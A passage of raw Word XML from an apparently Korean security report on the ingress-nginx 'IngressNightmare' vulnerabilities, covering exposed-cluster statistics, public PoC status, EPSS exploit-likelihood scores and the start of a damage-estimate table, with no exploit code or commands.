    <w:p w14:paraId="547193EB" w14:textId="77777777" w:rsidR="00D51C89" w:rsidRPr="00D51C89" w:rsidRDefault="00D51C89" w:rsidP="00D51C89">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="84"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D51C89">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>노드 간 이동: 컨테이너 탈출(CVE-2025-XXXX)을 통해 호스트 시스템 제어</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CDF25DD" w14:textId="77777777" w:rsidR="00D51C89" w:rsidRDefault="00D51C89" w:rsidP="009A035F">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="002598CE" w14:textId="77777777" w:rsidR="00D51C89" w:rsidRDefault="00D51C89" w:rsidP="009A035F">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="25BF274C" w14:textId="4F76B484" w:rsidR="001B086D" w:rsidRPr="001B086D" w:rsidRDefault="009A035F" w:rsidP="001B086D">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009A035F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">6.3 </w:t>
      </w:r>
      <w:r w:rsidR="00D51C89" w:rsidRPr="00D51C89">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>실제</w:t>
      </w:r>
      <w:r w:rsidR="00D51C89" w:rsidRPr="00D51C8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51C89" w:rsidRPr="00D51C89">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>인터넷</w:t>
      </w:r>
      <w:r w:rsidR="00D51C89" w:rsidRPr="00D51C8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51C89" w:rsidRPr="00D51C89">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>노출</w:t>
      </w:r>
      <w:r w:rsidR="00D51C89" w:rsidRPr="00D51C8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51C89" w:rsidRPr="00D51C89">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>클러스터</w:t>
      </w:r>
      <w:r w:rsidR="00D51C89" w:rsidRPr="00D51C8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51C89" w:rsidRPr="00D51C89">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>수</w:t>
      </w:r>
      <w:r w:rsidR="00D51C89" w:rsidRPr="00D51C89">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">, PoC </w:t>
      </w:r>
      <w:r w:rsidR="00D51C89" w:rsidRPr="00D51C89">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>공개</w:t>
      </w:r>
      <w:r w:rsidR="00D51C89" w:rsidRPr="00D51C8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51C89" w:rsidRPr="00D51C89">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>현황</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="13"/>
        <w:tblW w:w="8505" w:type="dxa"/>
        <w:tblInd w:w="108" w:type="dxa"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2141"/>
        <w:gridCol w:w="1290"/>
        <w:gridCol w:w="5074"/>
      </w:tblGrid>
      <w:tr w:rsidR="001B086D" w:rsidRPr="001B086D" w14:paraId="33529A91" w14:textId="77777777" w:rsidTr="001B0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  <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="31535B69" w14:textId="77777777" w:rsidR="001B086D" w:rsidRPr="001B086D" w:rsidRDefault="001B086D" w:rsidP="001B086D">
            <w:pPr>
              <w:spacing w:after="200" w:line="276" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="001B086D">
              <w:rPr>
                <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>지표</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="65E6ABF3" w14:textId="77777777" w:rsidR="001B086D" w:rsidRPr="001B086D" w:rsidRDefault="001B086D" w:rsidP="001B086D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lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="001B086D">
              <w:rPr>
                <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>값</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="5074" w:type="dxa"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5D5F7D31" w14:textId="77777777" w:rsidR="001B086D" w:rsidRPr="001B086D" w:rsidRDefault="001B086D" w:rsidP="001B086D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lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="001B086D">
              <w:rPr>
                <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>출처</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="001B086D" w:rsidRPr="001B086D" w14:paraId="42DBCA39" w14:textId="77777777" w:rsidTr="001B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  <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="03007762" w14:textId="77777777" w:rsidR="001B086D" w:rsidRPr="001B086D" w:rsidRDefault="001B086D" w:rsidP="001B086D">
            <w:pPr>
              <w:spacing w:after="200" w:line="276" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="001B086D">
              <w:rPr>
                <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>노출된 클러스터 수</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="43F0A1C0" w14:textId="77777777" w:rsidR="001B086D" w:rsidRPr="001B086D" w:rsidRDefault="001B086D" w:rsidP="001B086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1B086D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6,500+</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="5074" w:type="dxa"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="017A109B" w14:textId="6F73DDB7" w:rsidR="001B086D" w:rsidRPr="001B086D" w:rsidRDefault="001B086D" w:rsidP="001B086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1B086D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https://phoenix.security/ingressnightmare-ngnx/</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="001B086D" w:rsidRPr="001B086D" w14:paraId="49170F52" w14:textId="77777777" w:rsidTr="001B086D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  <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="04E9C43A" w14:textId="77777777" w:rsidR="001B086D" w:rsidRPr="001B086D" w:rsidRDefault="001B086D" w:rsidP="001B086D">
            <w:pPr>
              <w:spacing w:after="200" w:line="276" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="001B086D">
              <w:rPr>
                <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>취약한 클라우드 환경 비율</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1719AA02" w14:textId="77777777" w:rsidR="001B086D" w:rsidRPr="001B086D" w:rsidRDefault="001B086D" w:rsidP="001B086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1B086D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43%</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="5074" w:type="dxa"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4E9BC666" w14:textId="4786E2F0" w:rsidR="001B086D" w:rsidRPr="001B086D" w:rsidRDefault="001B086D" w:rsidP="001B086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1B086D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https://www.cybersecuritydive.com/news/critical-vulnerabilities-kubernetes-jeopardy/743448/</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="001B086D" w:rsidRPr="001B086D" w14:paraId="0FE391E9" w14:textId="77777777" w:rsidTr="001B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  <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="14B39595" w14:textId="77777777" w:rsidR="001B086D" w:rsidRPr="001B086D" w:rsidRDefault="001B086D" w:rsidP="001B086D">
            <w:pPr>
              <w:spacing w:after="200" w:line="276" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="001B086D">
              <w:rPr>
                <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>Fortune 500 기업 영향</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="487E31F8" w14:textId="77777777" w:rsidR="001B086D" w:rsidRPr="001B086D" w:rsidRDefault="001B086D" w:rsidP="001B086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1B086D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12개사 확인</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="5074" w:type="dxa"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2C4FE3D1" w14:textId="4C5D292E" w:rsidR="001B086D" w:rsidRPr="001B086D" w:rsidRDefault="001B086D" w:rsidP="001B086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1B086D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https://www.cybersecuritydive.com/news/critical-vulnerabilities-kubernetes-jeopardy/743448/</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4D23162D" w14:textId="4F6B4F08" w:rsidR="009A035F" w:rsidRPr="001B086D" w:rsidRDefault="001B086D" w:rsidP="009A035F">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="86"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001B086D">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>노출 원인</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidRPr="001B086D">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>Admission Controller가 기본값(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001B086D">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>ClusterIP</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001B086D">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/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1B086D">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>대신 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001B086D">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>LoadBalancer</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001B086D">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001B086D">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>NodePort</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001B086D">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>로 배포된 경우가 78%로 분석</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="467757B9" w14:textId="462EFF7B" w:rsidR="009A035F" w:rsidRPr="009A035F" w:rsidRDefault="009A035F" w:rsidP="009A035F">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009A035F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">6.4 </w:t>
      </w:r>
      <w:r w:rsidR="001B086D" w:rsidRPr="001B086D">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">PoC </w:t>
      </w:r>
      <w:r w:rsidR="001B086D" w:rsidRPr="001B086D">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>공개</w:t>
      </w:r>
      <w:r w:rsidR="001B086D" w:rsidRPr="001B086D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1B086D" w:rsidRPr="001B086D">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>현황</w:t>
      </w:r>
      <w:r w:rsidR="001B086D" w:rsidRPr="001B086D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1B086D" w:rsidRPr="001B086D">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>및</w:t>
      </w:r>
      <w:r w:rsidR="001B086D" w:rsidRPr="001B086D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1B086D" w:rsidRPr="001B086D">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>악용</w:t>
      </w:r>
      <w:r w:rsidR="001B086D" w:rsidRPr="001B086D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1B086D" w:rsidRPr="001B086D">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>가능성</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B3A0F30" w14:textId="3688F9F7" w:rsidR="001B086D" w:rsidRPr="001B086D" w:rsidRDefault="001B086D" w:rsidP="001B086D">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="87"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001B086D">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>PoC 상태</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D65792F" w14:textId="17EDA510" w:rsidR="001B086D" w:rsidRPr="001B086D" w:rsidRDefault="001B086D" w:rsidP="001B086D">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="87"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001B086D">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>CVE-2025-1974에 대한 공개 PoC 존재</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78E6C441" w14:textId="12E21D9F" w:rsidR="001B086D" w:rsidRPr="001B086D" w:rsidRDefault="001B086D" w:rsidP="001B086D">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="87"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001B086D">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>CVE-2025-24514는 아직 공개되지 않았으나, 유사 취약점(CVE-2025-1097)의 PoC가 GitHub에서 유출됨</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4803FD0E" w14:textId="3FEA3B31" w:rsidR="001B086D" w:rsidRPr="001B086D" w:rsidRDefault="001B086D" w:rsidP="001B086D">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="87"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="001B086D">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>EPSS(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="001B086D">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>Exploit Prediction Scoring System)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C0FDD46" w14:textId="2ECD74C6" w:rsidR="001B086D" w:rsidRPr="001B086D" w:rsidRDefault="001B086D" w:rsidP="001B086D">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="87"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001B086D">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>30일 내 악용 가능성 </w:t>
      </w:r>
      <w:r w:rsidRPr="001B086D">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>30.81%</w:t>
      </w:r>
      <w:r w:rsidRPr="001B086D">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t> (동일 계열 CVE 기준)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67A8A271" w14:textId="77777777" w:rsidR="001B086D" w:rsidRPr="001B086D" w:rsidRDefault="001B086D" w:rsidP="001B086D">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="87"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001B086D">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>역사적 유사 사례(CVE-2021-25735) 대비 2.3배 높은 위험도 평가</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B8803B2" w14:textId="149BB6B4" w:rsidR="009A035F" w:rsidRPr="009A035F" w:rsidRDefault="009A035F" w:rsidP="009A035F">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009A035F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">6.5 </w:t>
      </w:r>
      <w:r w:rsidR="001B086D">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>대응 지연 시 예상 피해 규모</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="13"/>
        <w:tblW w:w="8505" w:type="dxa"/>
        <w:tblInd w:w="250" w:type="dxa"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="1985"/>
        <w:gridCol w:w="2409"/>
        <w:gridCol w:w="4111"/>
      </w:tblGrid>
